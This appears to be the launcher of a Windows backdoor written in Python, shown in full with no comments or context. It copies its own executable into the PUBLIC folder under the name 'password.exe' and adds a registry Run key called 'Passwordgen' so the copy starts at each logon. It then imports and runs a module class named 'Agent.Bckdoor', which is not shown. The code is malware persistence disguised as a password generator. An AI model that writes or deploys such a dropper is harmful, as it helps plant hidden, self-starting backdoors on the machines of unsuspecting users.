import os
import sys
import subprocess
import shutil


filelocation = os.environ["PUBLIC"] + "\\password.exe"
if not os.path.exists(filelocation):
    shutil.copyfile(sys.executable, filelocation)
    subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Passwordgen /t REG_SZ /d "' + filelocation + '"', shell=True)


import Agent

myapp = Agent.Bckdoor
myapp()
